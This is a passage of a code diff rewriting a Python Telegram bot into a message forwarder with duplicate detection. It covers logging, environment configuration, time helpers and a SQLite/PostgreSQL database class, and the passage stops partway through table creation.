@@ -1,2820 +1,5629 @@
 #!/usr/bin/env python3
+"""
+FORWARDER + DUODETECTIVE BOT
+Combined bot that handles:
+1. Message forwarding with filters
+2. Duplicate message detection with notifications
+"""
 
 import os
-import time
-import json
-import threading
+import sys
+import asyncio
 import logging
+import hashlib
+import time
+import gc
+import json
+import sqlite3
+import threading
+import functools
 import re
 import signal
-import ssl
 from datetime import datetime, timedelta
-from typing import List, Dict, Tuple, Optional, Any
-from apscheduler.schedulers.background import BackgroundScheduler
+from typing import Dict, List, Optional, Tuple, Set, Callable, Any, DefaultDict
+from collections import OrderedDict, defaultdict, deque
+from dataclasses import dataclass
+from concurrent.futures import ThreadPoolExecutor
+import atexit
+
 from flask import Flask, request, jsonify
-import requests
-from urllib3.util import Retry
-from requests.adapters import HTTPAdapter
-import psycopg2
-from psycopg2 import pool
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError, FloodWaitError
 
-# Logging setup
-logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
-logger = logging.getLogger("multibot_wordsplitter")
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    MessageHandler,
+    filters,
+)
+from telegram.helpers import escape_markdown
 
-app = Flask(__name__)
+import psycopg
+from psycopg.rows import dict_row
+from urllib.parse import urlparse
 
-# ===================== CONFIGURATION =====================
+# ============================
+# LOGGING CONFIGURATION
+# ============================
+logging.getLogger("telethon").setLevel(logging.WARNING)
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("flask").setLevel(logging.WARNING)
 
-def parse_id_list(raw: str) -> List[int]:
-    if not raw:
-        return []
-    parts = re.split(r"[,\s]+", raw.strip())
-    ids = []
-    for p in parts:
-        if not p:
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    datefmt='%H:%M:%S',
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler('combined_bot_debug.log', mode='a', encoding='utf-8')
+    ]
+)
+logger = logging.getLogger("forwarder_duodetect")
+
+# ============================
+# TIMEZONE HELPER FUNCTIONS
+# ============================
+def get_utc1_time():
+    """Get current time in UTC+1 (Nigeria time)"""
+    utc_now = datetime.utcnow()
+    utc1_time = utc_now + timedelta(hours=1)  # UTC+1 for Nigeria
+    return utc1_time
+
+def format_time_utc1_am_pm(dt=None):
+    """
+    Format time in UTC+1 with AM/PM format, excluding seconds.
+    
+    Args:
+        dt: datetime object (optional, uses current time if not provided)
+    
+    Returns:
+        Formatted time string like: "2023-12-31 02:30 PM"
+    """
+    if dt is None:
+        dt = get_utc1_time()
+    
+    # Format to AM/PM without seconds
+    time_str = dt.strftime("%Y-%m-%d %I:%M %p")
+    # Remove leading zero from hour if present
+    if time_str[11] == '0':
+        time_str = time_str[:11] + time_str[12:]
+    return time_str
+
+def format_time_from_timestamp(timestamp):
+    """Convert timestamp to UTC+1 AM/PM format without seconds"""
+    utc_time = datetime.utcfromtimestamp(timestamp)
+    utc1_time = utc_time + timedelta(hours=1)
+    return format_time_utc1_am_pm(utc1_time)
+
+# ============================
+# ENVIRONMENT VARIABLES
+# ============================
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+API_ID = int(os.getenv("API_ID", "0"))
+API_HASH = os.getenv("API_HASH", "")
+
+# Database configuration
+DATABASE_TYPE = os.getenv("DATABASE_TYPE", "sqlite").lower()
+DATABASE_URL = os.getenv("DATABASE_URL")
+SQLITE_DB_PATH = os.getenv("SQLITE_DB_PATH", "combined_bot_data.db")
+
+if DATABASE_TYPE == "postgres" and not DATABASE_URL:
+    logger.warning("DATABASE_TYPE is set to 'postgres' but DATABASE_URL is not set!")
+    logger.warning("Falling back to SQLite")
+    DATABASE_TYPE = "sqlite"
+
+logger.info(f"Using database type: {DATABASE_TYPE}")
+
+# User sessions from environment
+USER_SESSIONS = {}
+user_sessions_env = os.getenv("USER_SESSIONS", "").strip()
+if user_sessions_env:
+    for session_entry in user_sessions_env.split(","):
+        if not session_entry or ":" not in session_entry:
             continue
         try:
-            ids.append(int(p))
-        except Exception:
+            user_id_str, session_string = session_entry.split(":", 1)
+            user_id = int(user_id_str.strip())
+            USER_SESSIONS[user_id] = session_string.strip()
+        except ValueError:
             continue
-    return ids
 
-# Configuration for all three bots
-BOTS_CONFIG = {
-    "bot_a": {
-        "name": "Bot A",
-        "token": os.environ.get("TELEGRAM_TOKEN_A", ""),
-        "webhook_url": os.environ.get("WEBHOOK_URL_A", ""),
-        "owner_ids_raw": os.environ.get("OWNER_IDS_A", ""),
-        "allowed_users_raw": os.environ.get("ALLOWED_USERS_A", ""),
-        "owner_tag": "Owner (@justmemmy)",
-        "interval_speed": "fast",
-        "max_queue_per_user": int(os.environ.get("MAX_QUEUE_PER_USER_A", "5")),
-        "max_msg_per_second": float(os.environ.get("MAX_MSG_PER_SECOND_A", "50")),
-        "max_concurrent_workers": int(os.environ.get("MAX_CONCURRENT_WORKERS_A", "25")),
-    },
-    "bot_b": {
-        "name": "Bot B",
-        "token": os.environ.get("TELEGRAM_TOKEN_B", ""),
-        "webhook_url": os.environ.get("WEBHOOK_URL_B", ""),
-        "owner_ids_raw": os.environ.get("OWNER_IDS_B", ""),
-        "allowed_users_raw": os.environ.get("ALLOWED_USERS_B", ""),
-        "owner_tag": "Owner (@justmemmy)",
-        "interval_speed": "fast",
-        "max_queue_per_user": int(os.environ.get("MAX_QUEUE_PER_USER_B", "5")),
-        "max_msg_per_second": float(os.environ.get("MAX_MSG_PER_SECOND_B", "50")),
-        "max_concurrent_workers": int(os.environ.get("MAX_CONCURRENT_WORKERS_B", "25")),
-    },
-    "bot_c": {
-        "name": "Bot C",
-        "token": os.environ.get("TELEGRAM_TOKEN_C", ""),
-        "webhook_url": os.environ.get("WEBHOOK_URL_C", ""),
-        "owner_ids_raw": os.environ.get("OWNER_IDS_C", ""),
-        "allowed_users_raw": os.environ.get("ALLOWED_USERS_C", ""),
-        "owner_tag": "Owner (@justmemmy)",
-        "interval_speed": "slow",
-        "max_queue_per_user": int(os.environ.get("MAX_QUEUE_PER_USER_C", "5")),
-        "max_msg_per_second": float(os.environ.get("MAX_MSG_PER_SECOND_C", "50")),
-        "max_concurrent_workers": int(os.environ.get("MAX_CONCURRENT_WORKERS_C", "25")),
-    }
-}
+# User permissions
+OWNER_IDS = set()
+owner_env = os.getenv("OWNER_IDS", "").strip()
+if owner_env:
+    OWNER_IDS.update(int(part) for part in owner_env.split(",") if part.strip().isdigit())
 
-# Shared settings
-SHARED_SETTINGS = {
-    "requests_timeout": float(os.environ.get("REQUESTS_TIMEOUT", "10")),
-    "log_retention_days": int(os.environ.get("LOG_RETENTION_DAYS", "30")),
-    "failure_notify_threshold": int(os.environ.get("FAILURE_NOTIFY_THRESHOLD", "6")),
-    "permanent_suspend_days": int(os.environ.get("PERMANENT_SUSPEND_DAYS", "365")),
-}
+ALLOWED_USERS = set()
+allowed_env = os.getenv("ALLOWED_USERS", "").strip()
+if allowed_env:
+    ALLOWED_USERS.update(int(part) for part in allowed_env.split(",") if part.strip().isdigit())
 
-# PostgreSQL connection pool
-POSTGRES_POOL = None
+# Performance settings
+SEND_WORKER_COUNT = int(os.getenv("SEND_WORKER_COUNT", "50"))
+SEND_QUEUE_MAXSIZE = int(os.getenv("SEND_QUEUE_MAXSIZE", "10000"))
+MONITOR_WORKER_COUNT = int(os.getenv("MONITOR_WORKER_COUNT", "10"))
+TARGET_RESOLVE_RETRY_SECONDS = int(os.getenv("TARGET_RESOLVE_RETRY_SECONDS", "3"))
+MAX_CONCURRENT_USERS = max(50, int(os.getenv("MAX_CONCURRENT_USERS", "200")))
+SEND_CONCURRENCY_PER_USER = int(os.getenv("SEND_CONCURRENCY_PER_USER", "30"))
+SEND_RATE_PER_USER = float(os.getenv("SEND_RATE_PER_USER", "30.0"))
+TARGET_ENTITY_CACHE_SIZE = int(os.getenv("TARGET_ENTITY_CACHE_SIZE", "100"))
 
-# Initialize bot-specific parsed lists
-for bot_id in BOTS_CONFIG:
-    config = BOTS_CONFIG[bot_id]
-    config["owner_ids"] = parse_id_list(config["owner_ids_raw"])
-    config["allowed_users"] = parse_id_list(config["allowed_users_raw"])
-    config["primary_owner"] = config["owner_ids"][0] if config["owner_ids"] else None
-    config["telegram_api"] = f"https://api.telegram.org/bot{config['token']}" if config['token'] else None
+# Duplicate detection settings
+DUPLICATE_CHECK_WINDOW = int(os.getenv("DUPLICATE_CHECK_WINDOW", "600"))
+MESSAGE_HASH_LIMIT = int(os.getenv("MESSAGE_HASH_LIMIT", "2000"))
 
-# ===================== GLOBALS =====================
+# Web server
+WEB_SERVER_PORT = int(os.getenv("WEB_SERVER_PORT", "5000"))
+DEFAULT_CONTAINER_MAX_RAM_MB = int(os.getenv("CONTAINER_MAX_RAM_MB", "512"))
 
-# Bot-specific global states
-BOT_STATES = {
-    bot_id: {
-        "user_workers": {},
-        "user_workers_lock": threading.Lock(),
-        "owner_ops_state": {},
-        "owner_ops_lock": threading.Lock(),
-        "token_bucket": None,
-        "active_workers_semaphore": None,
-        "session": None,
-        "session_created_at": 0,
-        "session_request_count": 0,
-        "worker_heartbeats": {},
-        "worker_heartbeats_lock": threading.Lock(),
-    }
-    for bot_id in BOTS_CONFIG
-}
+# GC interval
+GC_INTERVAL = int(os.getenv("GC_INTERVAL", "600"))
 
-# ===================== SHARED UTILITIES =====================
+# ============================
+# REGEX PATTERNS
+# ============================
+EMOJI_PATTERN = re.compile(
+    "["
+    "\U0001F600-\U0001F64F"
+    "\U0001F300-\U0001F5FF"
+    "\U0001F680-\U0001F6FF"
+    "\U0001F1E0-\U0001F1FF"
+    "\U00002702-\U000027B0"
+    "\U000024C2-\U0001F251"
+    "]+", flags=re.UNICODE
+)
 
-NIGERIA_TZ_OFFSET = timedelta(hours=1)
+WORD_PATTERN = re.compile(r'\S+')
+NUMERIC_PATTERN = re.compile(r'^\d+$')
+ALPHABETIC_PATTERN = re.compile(r'^[A-Za-z]+$')
 
-def now_ts() -> str:
-    """Return current UTC time without seconds"""
-    return datetime.utcnow().strftime("%Y-%m-%d %I:%M %p")
+# ============================
+# UNAUTHORIZED MESSAGE
+# ============================
+UNAUTHORIZED_MESSAGE = """🚫 **Access Denied!** 
 
-def utc_to_wat_ts(utc_ts: str) -> str:
-    """Convert UTC timestamp to WAT without seconds"""
-    try:
-        # Parse the timestamp (remove seconds if present)
-        utc_ts_clean = re.sub(r':\d{2}(?=\s|$)', '', utc_ts)
-        utc_dt = datetime.strptime(utc_ts_clean, "%Y-%m-%d %I:%M %p")
-        wat_dt = utc_dt + NIGERIA_TZ_OFFSET
-        return wat_dt.strftime("%b %d, %Y %I:%M %p")
-    except Exception:
+You are not authorized to use this bot.
+
+📞 **Call this number:** `07089430305`
+
+Or
+
+🗨️ **Message Developer:** [HEMMY](https://t.me/justmemmy)
+"""
+
+# ============================
+# DATABASE CLASS
+# ============================
+class Database:
+    
+    def __init__(self):
+        self.db_type = DATABASE_TYPE
+        self.db_path = SQLITE_DB_PATH
+        self.postgres_url = DATABASE_URL
+        
+        self._conn_init_lock = threading.Lock()
+        self._thread_local = threading.local()
+        self._thread_pool = ThreadPoolExecutor(max_workers=5, thread_name_prefix="db_worker")
+        
+        # Cache structures
+        self._user_cache: Dict[int, Dict] = {}
+        self._forwarding_tasks_cache: Dict[int, List[Dict]] = defaultdict(list)
+        self._monitoring_tasks_cache: Dict[int, List[Dict]] = defaultdict(list)
+        self._allowed_users_cache: Set[int] = set()
+        self._admin_cache: Set[int] = set()
+        
         try:
-            # Try alternative format
-            utc_dt = datetime.strptime(utc_ts, "%Y-%m-%d %H:%M:%S")
-            wat_dt = utc_dt + NIGERIA_TZ_OFFSET
-            return wat_dt.strftime("%b %d, %Y %I:%M %p")
-        except Exception:
-            return f"{utc_ts} (UTC error)"
-
-def format_datetime(dt: datetime) -> str:
-    """Format datetime without seconds"""
-    return dt.strftime("%b %d, %Y %I:%M %p")
-
-def at_username(u: str) -> str:
-    if not u:
-        return ""
-    return u.lstrip("@")
-
-def label_for_self(bot_id: str, viewer_id: int, username: str) -> str:
-    config = BOTS_CONFIG[bot_id]
-    if username:
-        if viewer_id in config["owner_ids"]:
-            return f"{at_username(username)} (ID: {viewer_id})"
-        return f"{at_username(username)}"
-    return f"(ID: {viewer_id})" if viewer_id in config["owner_ids"] else ""
-
-def label_for_owner_view(bot_id: str, target_id: int, target_username: str) -> str:
-    if target_username:
-        return f"{at_username(target_username)} (ID: {target_id})"
-    return str(target_id)
-
-# ===================== DATABASE =====================
-
-def init_postgres_pool():
-    """Initialize PostgreSQL connection pool"""
-    global POSTGRES_POOL
+            self.init_db()
+            self._load_caches()
+            logger.info(f"Database initialized with type: {self.db_type}")
+        except Exception as e:
+            logger.exception(f"Failed initializing DB: {e}")
+            try:
+                if os.path.exists(SQLITE_DB_PATH):
+                    os.remove(SQLITE_DB_PATH)
+                    logger.info("Removed corrupted database file")
+                self.init_db()
+                self._load_caches()
+            except Exception:
+                logger.exception("Failed to recreate DB")
+        
+        atexit.register(self.close_connection)
     
-    database_url = os.environ.get("DATABASE_URL")
-    if not database_url:
-        logger.error("DATABASE_URL environment variable is required")
-        raise ValueError("DATABASE_URL is required")
+    def _create_sqlite_connection(self) -> sqlite3.Connection:
+        conn = sqlite3.connect(self.db_path, timeout=30, check_same_thread=False)
+        conn.row_factory = sqlite3.Row
+        self._apply_sqlite_pragmas(conn)
+        return conn
     
-    try:
-        # Parse DATABASE_URL
-        POSTGRES_POOL = pool.SimpleConnectionPool(
-            minconn=1,
-            maxconn=20,  # Max connections for all bots
-            dsn=database_url
+    def _create_postgres_connection(self) -> psycopg.Connection:
+        if not self.postgres_url:
+            raise ValueError("DATABASE_URL not set for PostgreSQL")
+        
+        parsed = urlparse(self.postgres_url)
+        
+        dbname = parsed.path[1:]
+        user = parsed.username
+        password = parsed.password
+        host = parsed.hostname
+        port = parsed.port or 5432
+        
+        conn_str = f"postgresql://{user}:{password}@{host}:{port}/{dbname}"
+        
+        if parsed.query:
+            params = dict(pair.split('=') for pair in parsed.query.split('&') if '=' in pair)
+            sslmode = params.get('sslmode', 'require')
+            conn_str += f"?sslmode={sslmode}"
+        
+        conn = psycopg.connect(
+            conn_str,
+            autocommit=False,
+            row_factory=dict_row
         )
-        logger.info("PostgreSQL connection pool initialized")
-        
-        # Test connection and create schema
-        conn = POSTGRES_POOL.getconn()
+        return conn
+    
+    def _apply_sqlite_pragmas(self, conn: sqlite3.Connection):
         try:
-            create_schema(conn)
-            conn.commit()
-        finally:
-            POSTGRES_POOL.putconn(conn)
-            
-    except Exception as e:
-        logger.exception("Failed to initialize PostgreSQL pool: %s", e)
-        raise
-
-def create_schema(conn):
-    """Create database schema for all bots"""
-    cursor = conn.cursor()
-    
-    # Create tables for bot_a
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_allowed_users (
-        user_id BIGINT PRIMARY KEY,
-        username TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_tasks (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        text TEXT,
-        words_json TEXT,
-        total_words INTEGER,
-        sent_count INTEGER DEFAULT 0,
-        status TEXT,
-        created_at TEXT,
-        started_at TEXT,
-        finished_at TEXT,
-        last_activity TEXT,
-        retry_count INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_split_logs (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        words INTEGER,
-        created_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_sent_messages (
-        id SERIAL PRIMARY KEY,
-        chat_id BIGINT,
-        message_id BIGINT,
-        sent_at TEXT,
-        deleted INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_suspended_users (
-        user_id BIGINT PRIMARY KEY,
-        suspended_until TEXT,
-        reason TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_a_send_failures (
-        user_id BIGINT PRIMARY KEY,
-        failures INTEGER,
-        last_failure_at TEXT,
-        notified INTEGER DEFAULT 0,
-        last_error_code INTEGER,
-        last_error_desc TEXT
-    )""")
-    
-    # Create tables for bot_b
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_allowed_users (
-        user_id BIGINT PRIMARY KEY,
-        username TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_tasks (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        text TEXT,
-        words_json TEXT,
-        total_words INTEGER,
-        sent_count INTEGER DEFAULT 0,
-        status TEXT,
-        created_at TEXT,
-        started_at TEXT,
-        finished_at TEXT,
-        last_activity TEXT,
-        retry_count INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_split_logs (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        words INTEGER,
-        created_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_sent_messages (
-        id SERIAL PRIMARY KEY,
-        chat_id BIGINT,
-        message_id BIGINT,
-        sent_at TEXT,
-        deleted INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_suspended_users (
-        user_id BIGINT PRIMARY KEY,
-        suspended_until TEXT,
-        reason TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_b_send_failures (
-        user_id BIGINT PRIMARY KEY,
-        failures INTEGER,
-        last_failure_at TEXT,
-        notified INTEGER DEFAULT 0,
-        last_error_code INTEGER,
-        last_error_desc TEXT
-    )""")
-    
-    # Create tables for bot_c
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_allowed_users (
-        user_id BIGINT PRIMARY KEY,
-        username TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_tasks (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        text TEXT,
-        words_json TEXT,
-        total_words INTEGER,
-        sent_count INTEGER DEFAULT 0,
-        status TEXT,
-        created_at TEXT,
-        started_at TEXT,
-        finished_at TEXT,
-        last_activity TEXT,
-        retry_count INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_split_logs (
-        id SERIAL PRIMARY KEY,
-        user_id BIGINT,
-        username TEXT,
-        words INTEGER,
-        created_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_sent_messages (
-        id SERIAL PRIMARY KEY,
-        chat_id BIGINT,
-        message_id BIGINT,
-        sent_at TEXT,
-        deleted INTEGER DEFAULT 0
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_suspended_users (
-        user_id BIGINT PRIMARY KEY,
-        suspended_until TEXT,
-        reason TEXT,
-        added_at TEXT
-    )""")
-    
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS bot_c_send_failures (
-        user_id BIGINT PRIMARY KEY,
-        failures INTEGER,
-        last_failure_at TEXT,
-        notified INTEGER DEFAULT 0,
-        last_error_code INTEGER,
-        last_error_desc TEXT
-    )""")
-
-def get_db_connection():
-    """Get a database connection from pool"""
-    if not POSTGRES_POOL:
-        raise Exception("Database pool not initialized")
-    return POSTGRES_POOL.getconn()
-
-def return_db_connection(conn):
-    """Return connection to pool"""
-    if POSTGRES_POOL and conn:
-        POSTGRES_POOL.putconn(conn)
-
-def execute_query(bot_id: str, query: str, params: tuple = (), fetch_one: bool = False, fetch_all: bool = False):
-    """Execute a query for specific bot"""
-    conn = None
-    try:
-        conn = get_db_connection()
-        cursor = conn.cursor()
-        
-        # Replace table prefixes based on bot_id
-        table_prefix = f"bot_{bot_id.split('_')[-1]}_"
-        query = query.replace("{prefix}", table_prefix)
-        
-        cursor.execute(query, params)
-        
-        if fetch_one:
-            result = cursor.fetchone()
-        elif fetch_all:
-            result = cursor.fetchall()
-        else:
-            result = cursor.rowcount
-        
-        conn.commit()
-        return result
-    except Exception as e:
-        logger.error("Database query failed for %s: %s", bot_id, e)
-        if conn:
-            conn.rollback()
-        raise
-    finally:
-        if conn:
-            return_db_connection(conn)
-
-# Initialize PostgreSQL
-init_postgres_pool()
-
-# Ensure owners auto-added as allowed
-for bot_id in BOTS_CONFIG:
-    config = BOTS_CONFIG[bot_id]
-    for oid in config["owner_ids"]:
-        try:
-            execute_query(
-                bot_id,
-                "INSERT INTO {prefix}allowed_users (user_id, username, added_at) VALUES (%s, %s, %s) ON CONFLICT (user_id) DO NOTHING",
-                (oid, "", now_ts())
-            )
+            conn.execute("PRAGMA journal_mode=WAL;")
+            conn.execute("PRAGMA synchronous=NORMAL;")
+            conn.execute("PRAGMA temp_store=MEMORY;")
+            conn.execute("PRAGMA cache_size=-1000;")
+            conn.execute("PRAGMA mmap_size=268435456;")
         except Exception:
-            logger.exception("Error ensuring owner in allowed_users for %s", bot_id)
+            pass
     
-    # Ensure provided ALLOWED_USERS auto-added
-    for uid in config["allowed_users"]:
-        if uid in config["owner_ids"]:
-            continue
+    def _load_caches(self):
         try:
-            execute_query(
-                bot_id,
-                "INSERT INTO {prefix}allowed_users (user_id, username, added_at) VALUES (%s, %s, %s) ON CONFLICT (user_id) DO NOTHING",
-                (uid, "", now_ts())
-            )
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                cur.execute("SELECT user_id, is_admin FROM allowed_users")
+                rows = cur.fetchall()
+                for row in rows:
+                    user_id = row["user_id"]
+                    self._allowed_users_cache.add(user_id)
+                    if row["is_admin"]:
+                        self._admin_cache.add(user_id)
+                
+                cur.execute("""
+                    SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
+                    FROM users WHERE is_logged_in = 1
+                """)
+                rows = cur.fetchall()
+                for row in rows:
+                    uid = row["user_id"]
+                    entry = {
+                        'user_id': uid,
+                        'phone': row["phone"],
+                        'name': row["name"],
+                        'session_data': row["session_data"],
+                        'is_logged_in': bool(row["is_logged_in"]),
+                        'created_at': row["created_at"],
+                        'updated_at': row["updated_at"]
+                    }
+                    self._user_cache[uid] = entry
+                    
+            else:
+                with conn.cursor() as cur:
+                    cur.execute("SELECT user_id, is_admin FROM allowed_users")
+                    rows = cur.fetchall()
+                    for row in rows:
+                        user_id = row["user_id"]
+                        self._allowed_users_cache.add(user_id)
+                        if row["is_admin"]:
+                            self._admin_cache.add(user_id)
+                    
+                    cur.execute("""
+                        SELECT user_id, phone, name, session_data, is_logged_in, created_at, updated_at 
+                        FROM users WHERE is_logged_in = TRUE
+                    """)
+                    rows = cur.fetchall()
+                    for row in rows:
+                        uid = row["user_id"]
+                        entry = {
+                            'user_id': uid,
+                            'phone': row["phone"],
+                            'name': row["name"],
+                            'session_data': row["session_data"],
+                            'is_logged_in': row["is_logged_in"],
+                            'created_at': row["created_at"].isoformat() if row["created_at"] else None,
+                            'updated_at': row["updated_at"].isoformat() if row["updated_at"] else None
+                        }
+                        self._user_cache[uid] = entry
+
+            logger.info(f"Loaded caches: {len(self._allowed_users_cache)} allowed users, {len(self._user_cache)} logged-in users")
+        except Exception as e:
+            logger.exception("Error loading caches: %s", e)
+    
+    def get_connection(self):
+        conn = getattr(self._thread_local, "conn", None)
+        
+        if conn:
             try:
-                if config["telegram_api"]:
-                    get_session(bot_id).post(f"{config['telegram_api']}/sendMessage", json={
-                        "chat_id": uid, "text": "✅ You have been added. Send any text to start."
-                    }, timeout=3)
+                if self.db_type == "sqlite":
+                    conn.execute("SELECT 1")
+                else:
+                    with conn.cursor() as cur:
+                        cur.execute("SELECT 1")
+                return conn
             except Exception:
-                pass
+                try:
+                    conn.close()
+                except Exception:
+                    pass
+                self._thread_local.conn = None
+        
+        try:
+            if self.db_type == "sqlite":
+                self._thread_local.conn = self._create_sqlite_connection()
+            else:
+                self._thread_local.conn = self._create_postgres_connection()
+            return self._thread_local.conn
+        except Exception as e:
+            logger.exception("Failed to create DB connection: %s", e)
+            raise
+    
+    def close_connection(self):
+        conn = getattr(self._thread_local, "conn", None)
+        if conn:
+            try:
+                conn.close()
+            except Exception:
+                logger.exception("Failed to close DB connection")
+            self._thread_local.conn = None
+    
+    def init_db(self):
+        with self._conn_init_lock:
+            conn = self.get_connection()
+            
+            if self.db_type == "sqlite":
+                cur = conn.cursor()
+                
+                # Users table
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS users (
+                        user_id INTEGER PRIMARY KEY,
+                        phone TEXT,
+                        name TEXT,
+                        session_data TEXT,
+                        is_logged_in INTEGER DEFAULT 0,
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now'))
+                    )
+                """)
+                
+                # Forwarding tasks table
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS forwarding_tasks (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        user_id INTEGER,
+                        label TEXT,
+                        source_ids TEXT,
+                        target_ids TEXT,
+                        filters TEXT,
+                        is_active INTEGER DEFAULT 1,
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now')),
+                        FOREIGN KEY (user_id) REFERENCES users (user_id),
+                        UNIQUE(user_id, label)
+                    )
+                """)
+                
+                # Monitoring tasks table
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS monitoring_tasks (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        user_id INTEGER,
+                        label TEXT,
+                        chat_ids TEXT,
+                        settings TEXT,
+                        is_active INTEGER DEFAULT 1,
+                        created_at TEXT DEFAULT (datetime('now')),
+                        updated_at TEXT DEFAULT (datetime('now')),
+                        FOREIGN KEY (user_id) REFERENCES users (user_id),
+                        UNIQUE(user_id, label)
+                    )
+                """)
+                
+                # Allowed users table
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS allowed_users (
+                        user_id INTEGER PRIMARY KEY,
+                        username TEXT,
+                        is_admin INTEGER DEFAULT 0,
+                        added_by INTEGER,
+                        created_at TEXT DEFAULT (datetime('now'))
+                    )
+                """)
+                
+                # Create indexes
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_users_logged_in ON users(is_logged_in)")
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_forwarding_tasks_user_active ON forwarding_tasks(user_id, is_active)")
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_monitoring_tasks_user_active ON monitoring_tasks(user_id, is_active)")
+                cur.execute("CREATE INDEX IF NOT EXISTS idx_allowed_admins ON allowed_users(is_admin)")
+                
+                conn.commit()
+                
+            else:
+                with conn.cursor() as cur:
+                    # Users table
+                    cur.execute("""
+                        CREATE TABLE IF NOT EXISTS users (
+                            user_id BIGINT PRIMARY KEY,
+                            phone VARCHAR(255),
+                            name TEXT,
+                            session_data TEXT,
+                            is_logged_in BOOLEAN DEFAULT FALSE,
+                            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                        )
+                    """)
+                    
+                    # Forwarding tasks table
+                    cur.execute("""
+                        CREATE TABLE IF NOT EXISTS forwarding_tasks (
+                            id SERIAL PRIMARY KEY,
+                            user_id BIGINT,
+                            label VARCHAR(255),
+                            source_ids JSONB,
+                            target_ids JSONB,
+                            filters JSONB,
+                            is_active BOOLEAN DEFAULT TRUE,
+                            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            FOREIGN KEY (user_id) REFERENCES users (user_id),
+                            UNIQUE(user_id, label)
+                        )
+                    """)
+                    
+                    # Monitoring tasks table
+                    cur.execute("""
+                        CREATE TABLE IF NOT EXISTS monitoring_tasks (
+                            id SERIAL PRIMARY KEY,
+                            user_id BIGINT,
+                            label VARCHAR(255),
+                            chat_ids JSONB,
+                            settings JSONB,
+                            is_active BOOLEAN DEFAULT TRUE,
+                            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            FOREIGN KEY (user_id) REFERENCES users (user_id),
+                            UNIQUE(user_id, label)
+                        )
+                    """)
+                    
+                    # Allowed users table
+                    cur.execute("""
+                        CREATE TABLE IF NOT EXISTS allowed_users (
+                            user_id BIGINT PRIMARY KEY,
+                            username VARCHAR(255),
+                            is_admin BOOLEAN DEFAULT FALSE,
+                            added_by BIGINT,
+                            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                        )
+                    """)
+                    
+                    # Create indexes
+                    cur.execute("""
+                        CREATE INDEX IF NOT EXISTS idx_users_logged_in ON users(is_logged_in)
+                    """)
+                    cur.execute("""
+                        CREATE INDEX IF NOT EXISTS idx_forwarding_tasks_user_active ON forwarding_tasks(user_id, is_active)
+                    """)
+                    cur.execute("""
+                        CREATE INDEX IF NOT EXISTS idx_monitoring_tasks_user_active ON monitoring_tasks(user_id, is_active)
+                    """)
+                    cur.execute("""
+                        CREATE INDEX IF NOT EXISTS idx_allowed_admins ON allowed_users(is_admin)
+                    """)
+                    
+                conn.commit()
+            
